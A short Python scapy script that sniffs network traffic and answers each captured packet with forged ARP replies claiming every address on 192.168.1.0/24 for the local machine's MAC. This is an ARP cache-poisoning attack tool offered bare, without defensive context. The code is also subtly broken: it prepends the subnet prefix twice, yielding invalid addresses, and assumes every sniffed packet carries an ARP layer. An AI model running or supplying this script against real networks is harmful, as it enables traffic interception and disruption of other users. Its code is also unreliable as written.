#!/usr/bin/python
from scapy.all import *
import uuid

def execute(pkt):
    for i in range(1, 256):
        ip = '192.168.1.' + str(i)
        packet = NewPacket(pkt, ip)
        send(packet)

def NewPacket(pkt, ip):
    packet = ARP(hwsrc=get_mac(), psrc='192.168.1.' + str(ip), hwdst=pkt[ARP].hwsrc, pdst=pkt[ARP].psrc, op=2)
    return packet

def get_mac():
    return str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8 * 6, 8)][::-1])).upper()

sniff(prn=execute)
